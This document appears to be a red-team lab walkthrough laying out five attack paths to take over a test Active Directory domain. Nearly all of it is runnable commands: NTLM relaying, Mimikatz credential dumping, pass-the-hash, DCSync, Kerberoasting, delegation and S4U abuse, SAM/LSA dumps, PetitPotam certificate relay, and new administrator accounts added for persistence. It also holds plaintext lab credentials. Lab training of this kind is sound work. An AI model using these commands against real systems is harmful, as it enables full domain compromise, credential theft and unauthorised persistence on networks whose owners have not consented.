# Start
### Download the ```wg0.conf``` file

### Start the wg0 interface
```
sudo wg-quick up ~/wg0.conf
```

### Stop the wg0 inteface
```
sudo wg-quick down ~/wg0.conf
```

# Attack Path 1

## FILE01 ##
### Detecting two connections to our machine
```
sudo responder -I wg0
```

### Adding a new administrator user to FILE01
```
python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py --no-http-server -smb2support -t smb://192.168.0.21 -c 'net user {NewUser} {NewUser Password} /add' -debug
python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py --no-http-server -smb2support -t smb://192.168.0.21 -c 'net localgroup Administrators {NewUser} /add' -debug
```

## MGMT01 ##
### Dump NTLM hashes in LSASS on FILE01
Retrieve Mimikatz from ```http://192.168.0.37``` (PORTAL01 machine) or from your own hosted server (```http://192.168.100.1```)

```
.\mimikatz.exe
    privilege::debug
    sekurlsa::logonpasswords
```

### Login to MGMT01 via PTH
```
.\mimikatz.exe
    privilege::debug
    sekurlsa::pth /user:adm_mgmtserver /domain:redteam.local /ntlm:f66d666905077e4cd476740106a74646

In the newly created window
.\PsExec64.exe \\MGMT01 -i -s cmd.exe
```

```
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes :{NT hash} redteam.local/adm_mgmtserver@192.168.0.31
```

```
python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes :{NT hash} redteam.local/adm_mgmtserver@192.168.0.31
```

### Add user (to allow login via RDP)
```
net user {Username} {Password} /add && net localgroup Administrators {Username} /add
```

## WEB01
### Find credentials in file in ```C:\Users\Administrator\Desktop\``` (MGMT01)

## DC01
### Detect if spoolss is enabled on the DC

Execute in Powershell:
```
dir \\DC01\pipe\spoolss
```

### SpoolSample attack via Unconstrained Delegation via WEB01
Retrieve Rubeus.exe / SpoolSample.exe / Mimikatz.exe from ```http://192.168.0.37``` (PORTAL01 machine) or from your own hosted server (```http://192.168.100.1```)

Execute as Administrator:
```
.\Rubeus.exe monitor /interval:5 /filteruser:DC01$ /nowrap
```

Execute in a second cmd window (not necessarily as admin):
```
.\SpoolSample.exe DC01 WEB01
```

Extract the ticket from the origianl Rubeus window
```
.\Rubeus.exe ptt /ticket:{ticket}
```

Use ticket to execute DCSync attack
```
.\mimikatz.exe
    lsadump::dcsync /domain:redteam.local /user:redteam\{krbtgt|adm_dc}
```

### Login to DC01 via PTH
```
.\mimikatz.exe
    privilege::debug
    sekurlsa::pth /user:{user} /domain:redteam.local /ntlm:{NT hash}
```

```
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes :{NT hash} redteam.local/{user}@192.168.0.100
```

```
python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes :{NT hash} redteam.local/{user}@192.168.0.100
```

# Attack Path 2
## DC01
### Relay credentials to LDAP on DC
```
python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py --no-smb-server -t ldap://192.168.0.100 --add-computer {NewComputer} {NewComputer Password}
```

### Use the newly created credentials to dump LDAP
```
ldapdomaindump -u redteam.local\\{NewComputer}$ -p "{NewComputer Password}" 192.168.0.100
```

### Several methods to use empty password
Without supplying a password:
```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc-ntlm -dc-ip 192.168.0.100 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 redteam.local/adm_domain@192.168.0.100
```

Prompts for an empty password (just use enter):
```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc-ntlm -dc-ip 192.168.0.100 redteam.local/adm_domain@192.168.0.100
```

```
netexec rdp -u adm_domain -p '' -d redteam.local 192.168.0.100
```

```
netexec ldap -u adm_domain -p '' -d redteam.local 192.168.0.100
```

```
netexec smb -u adm_domain -p '' -d redteam.local 192.168.0.100
```

```
netexec wmi -u adm_domain -p '' -d redteam.local 192.168.0.100
```

# Attack Path 3
### Previous steps in Attack Path 2

## ENG01
### Find credentials (```adm_engserver```) in LDAP domaindump (```domain_users.grep```) and login into ENG01

## WEB02
### Find credentials of local Admin BackupAdmin in SAM dump via secretsdump
```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py redteam.local/adm_engserver@192.168.0.22
```

### Find credentials of local Admin BackupAdmin in SAM dump via SAM/SYSTEM dump
```
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py redteam.local/adm_engserver@192.168.0.22

reg save HKLM\SYSTEM C:\SYSTEM
reg save HKLM\SAM C:\SAM

lget C:\SYSTEM
lget C:\SAM
```

```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py  -system SYSTEM -sam SAM local
```

```
python3 /usr/share/creddump7/pwdump.py SYSTEM SAM
```

### PTH to WEB02
```
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes :{NT hash} BackupAdmin@192.168.0.32
```

## DATA02 ##
### Collect NT hash of WEB02$ machine (secretsdump, or use Mimikatz)
```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -hashes :{NT hash} BackupAdmin@192.168.0.32
```

### Request TGT as WEB02 using Rubeus
```
.\Rubeus.exe asktgt /user:WEB02$ /domain:redteam.local /rc4:{NT hash} /nowrap
```

### Remove newlines and empty space if required (locally on your own machine, if /nowrap fails)
```
cat ticket.txt | sed 's/      //g' | tr -d '\n'
```

### Request TGS impersonating the Domain Administrator on DATA02
```
.\Rubeus.exe s4u /ticket:{ticket} /impersonateuser:Administrator /msdsspn:MSSQL/DATA02 /altservice:CIFS /ptt
```

### Authenticate to DATA02 using PsExec
```
.\PsExec64.exe \\DATA02 -i -s cmd.exe
```

### Add a local user
```
net user {NewUser} {NewUser Password} /add && net localgroup Administrators {NewUser} /add
```

## DC01 ##
### Start shell as NT Authority\SYSTEM
Retrieve PsExec64.exe from ```http://live.sysinternals.com``` or ```http://192.168.0.37``` (PORTAL01 machine) or from your own hosted server (```http://192.168.100.1```)
```
.\PsExec64.exe -i -s cmd.exe
```

### List tickets
```
.\Rubeus.exe triage
```

### Dump ticket of adm_da user
```
.\Rubeus.exe dump /luid:{luid} /nowrap
```

### Request a TGS to the CIFS service on DC01
Execute Rubeus command in there
```
.\Rubeus.exe asktgs /user:adm_da /ticket:{krbtgt_ticket} /service:CIFS/DC01 /ptt
```

### List whether we can read the C-drive on the DC
```
dir \\DC01\C$
```

### Authenticate using PsExec64
```
.\PsExec64.exe \\DC01 -i -s cmd.exe
```

### Add persistence by adding new user (becomes a Domain Admin)
```
net user {NewUser} {NewUser Password} /add && net localgroup Administrators {NewUser} /add
```

### Perform secretsdump to obtain all secrets in the domain
```
sudo /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc-ntlm -dc-ip 192.168.0.100 redteam.local/{NewUser}@192.168.0.100
```

# Attack Path 4
### Previous steps in Attack Path 2

## WEB03 ##
### Request TGS for each user account that has a SPN configured
```
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request -dc-ip 192.168.0.100 -hashes :{NT hash} -outputfile kerberoast_redteam_local.txt redteam.local/TESTCOMPUTER$
```

### Crack the TGT to obtain the plaintext password of the account (with local admin privileges on WEB03$)
```
hashcat -m 13100 kerberoast_redteam_local.txt -o crack.txt /usr/share/wordlists/rockyou.txt
```

### Authenticate via RDP/PTH

## DATA03 ##
### Dump NT hash of WEB03$ account
```
.\mimikatz.exe
    sekurlsa::logonpasswords
```

### Perform RBCD attack
```
.\Rubeus.exe s4u /user:WEB03$ /rc4:{NT hash} /impersonateuser:Administrator /msdsspn:CIFS/DATA03 /ptt
```

### List C-drive on DATA03
```
dir \\DATA03\C$
```

### PsExec into the machine
```
.\PsExec64.exe \\DATA03 -i -s cmd.exe
```

### Add a local user for persistence
```
net user {NewUser} {NewUser Password} /add && net localgroup Administrators {NewUser} /add
```

## MGMT03
### Add registry allowing local users to perform logins via WMI on DATA03
```
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f /v LocalAccountTokenFilterPolicy /t Reg_DWORD /d 1
```

### Dump LSA secrets using secretsdump
```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py {NewUser}@192.168.0.33
```

### Dump LSA secrets using reg save
```
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py {NewUser}@192.168.0.33

reg save HKLM\SYSTEM C:\SYSTEM
reg save HKLM\SAM C:\SAM

lget C:\SYSTEM
lget C:\SAM

python3 /usr/share/creddump7/lsadump.py SYSTEM SECURITY true
```

### Dump LSA secrets using netexec
```
netexec smb 192.168.0.33 -d WORKGROUP -u {NewUser} -p {NewUser Password} --lsa
```

### Authenticate to MGMT03

## DC01
### Dump NTLM hashes in LSASS (on MGMT03)
```
.\mimikatz.exe
    privilege::debug
    sekurlsa::logonpasswords
```

### Login to DC01 via PTH
```
.\mimikatz.exe
    privilege::debug
    sekurlsa::pth /user:adm_dc /domain:redteam.local /ntlm:{NT hash}
```

```
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes :{NT hash} redteam.local/adm_dc@192.168.0.100
```

```
python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes :{NT hash} redteam.local/adm_dc@192.168.0.100
```

# Attack Path 5
### Previous steps in Attack Path 2
Note: https://github.com/fortra/impacket/issues/1716 - pyOpenSSL does not recognize PKCS12 anymore by default
You might have to add the following on top of /etc/resolv.conf
```
search redteam.local
nameserver 192.168.0.100
```

### Add DNS entry to domain (pointing to our attacker machine) (https://github.com/dirkjanm/krbrelayx)
```sudo python3 dnstool.py -u "redteam.local\\adm_engserver" -p "MOdfr391tU3U2jS9vY" -r 'pki41UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' -d "192.168.100.1" --action add "192.168.0.100"```

### Running ntlmrelayx for relaying request from DC01$ to CA to request a .pfx certificate as DC01$
```sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -debug -smb2support --target http://ca01.redteam.local/certsrv/certfnsh.asp --adcs --template KerberosAuthentication```

### Running PetitPotam (https://github.com/topotam/PetitPotam) to obtain a certificate
```sudo python3 PetitPotam.py -u 'adm_engserver' -p 'MOdfr391tU3U2jS9vY' -d redteam.local -dc-ip 192.168.0.100 'pki41UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' dc01.redteam.local```

### Running gettgtpkinit.py (https://github.com/dirkjanm/PKINITtools) to obtain a TGT as DC01$ for the DC01$.pfx
```python3 gettgtpkinit.py redteam.local/DC01\$ -cert-pfx DC01\$.pfx DC01.ccache```

### Running getnthash.py (https://github.com/dirkjanm/PKINITtools) to obtain the NT hash of the DC01$ user (can be used to perform DCSync)
```KRB5CCNAME=DC01.ccache python3 getnthash.py -dc-ip 192.168.0.100 redteam.local/DC01\$ -key {key_obtained_in_previous_command}```

### Running DCSync/Secretsdump
```python3 /usr/share/doc/python3-impacket/examples/secretsdump.py 'redteam.local'/'DC01$'@'192.168.0.100' -hashes :{nt_hash_from_previous_command}```
